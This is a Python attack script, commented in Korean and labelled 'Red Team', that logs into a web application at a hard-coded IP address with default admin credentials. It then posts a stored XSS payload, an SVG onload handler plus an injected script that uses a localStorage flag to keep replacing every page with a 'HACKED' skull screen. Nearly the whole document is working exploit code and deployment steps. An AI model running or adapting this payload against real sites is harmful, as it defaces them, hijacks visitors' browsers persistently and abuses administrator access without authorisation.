#!/usr/bin/env python3
"""
전역 Defacement - 모든 페이지에서 작동
localStorage 기반으로 한번 해킹당하면 모든 페이지에서 리다이렉트
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
NEW_POST_URL = f"{TARGET}/new_post.php"

USERNAME = "admin"
PASSWORD = "admin123"

# 향상된 SVG Defacement (localStorage + 전역 리다이렉트)
DEFACE_GLOBAL = """<svg onload="(function(){
  // localStorage에 해킹 플래그 저장
  localStorage.setItem('site_hacked', '1');

  // 페이지 전체 교체
  document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace;font-size:14px\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:blink 0.5s infinite\\'>HACKED</h1><p style=\\'font-size:1.2em;margin:20px 0\\'>SYSTEM COMPROMISED</p><p style=\\'line-height:1.8\\'>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style=\\'margin-top:20px\\'>-- Red Team --</p></div></div><style>@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}</style>';

  // 다른 페이지에서도 작동하도록 전역 스크립트 주입
  var globalScript = document.createElement('script');
  globalScript.innerHTML = `
    (function(){
      if(localStorage.getItem('site_hacked')==='1'){
        document.addEventListener('DOMContentLoaded', function(){
          setTimeout(function(){
            document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\"><div style=\"text-align:center\"><pre style=\"color:#0f0;font-family:monospace;font-size:14px\">    _.--\\\"\\\"-._\\\\n .\\\"         \\\".\\\\n/             \\\\\\\\\\\\n|,  .-.  .-.  ,|\\\\n| )(__/  \\\\\\\\__)( |\\\\n|/     /\\\\\\\\     \\\\\\\\|\\\\n(_     ^^     _)\\\\n \\\\\\\\____________/</pre><h1 style=\"color:#f00;font-size:3em;animation:blink 0.5s infinite\">HACKED</h1><p style=\"font-size:1.2em;margin:20px 0\">SYSTEM COMPROMISED</p><p style=\"line-height:1.8\">[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style=\"margin-top:20px\">-- Red Team --</p></div></div><style>@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}</style>';
          }, 100);
        });
      }
    })();
  `;
  document.head.appendChild(globalScript);
})()"></svg>"""

# 더 간단한 버전 - 모든 페이지에서 localStorage 체크
DEFACE_SIMPLE = """<svg onload="localStorage.setItem('h','1');document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:blink 0.5s infinite\\'>HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div><style>@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}</style>'"></svg>

<script>
// 모든 페이지에서 localStorage 체크
(function(){
  if(localStorage.getItem('h')==='1'){
    document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999"><div style="text-align:center"><pre style="color:#0f0;font-family:monospace">    _.--""-._\\n ."         ".\\n/             \\\\\\n|,  .-.  .-.  ,|\\n| )(__/  \\\\__)( |\\n|/     /\\\\     \\\\|\\n(_     ^^     _)\\n \\\\____________/</pre><h1 style="color:#f00;font-size:3em;animation:blink 0.5s infinite">HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div><style>@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}</style>';
  }
})();
</script>"""

def login():
    """로그인"""
    session = requests.Session()
    data = {'username': USERNAME, 'password': PASSWORD}
    response = session.post(LOGIN_URL, data=data)

    if 'admin' in response.text or response.status_code == 302:
        print("[+] Login successful")
        return session
    else:
        print("[-] Login failed")
        return None

def post_content(session, content):
    """게시물 작성"""
    data = {'content': content}
    response = session.post(NEW_POST_URL, data=data)

    if response.status_code == 200:
        print("[+] Defacement payload posted")
        return True
    else:
        print("[-] Failed to post")
        return False

def deploy():
    """배포"""
    print("=" * 60)
    print("💀 Global Defacement - 모든 페이지에서 작동")
    print("=" * 60)
    print()

    session = login()
    if not session:
        return

    print()
    print("[*] Deploying global defacement payload...")
    print()

    # 간단한 버전 사용
    post_content(session, DEFACE_SIMPLE)

    print()
    print("=" * 60)
    print("✅ Deployed!")
    print("=" * 60)
    print()
    print("작동 방식:")
    print("1. 사용자가 메인 페이지 접속 → XSS 실행")
    print("2. localStorage에 'h=1' 저장")
    print("3. 해골 화면 표시")
    print("4. 사용자가 다른 페이지(file.php, profile.php) 접속")
    print("5. <script> 태그가 localStorage 체크")
    print("6. 'h=1'이 있으면 → 해골 화면 표시")
    print()
    print("→ 메인 페이지를 한번 본 사용자는 모든 페이지에서 해골 화면!")
    print()
    print("테스트:")
    print(f"1. {TARGET}/ 접속 (메인 페이지)")
    print(f"2. {TARGET}/profile.php 접속 (해골 나와야 함)")
    print(f"3. {TARGET}/file.php 접속 (해골 나와야 함)")
    print()

if __name__ == "__main__":
    deploy()
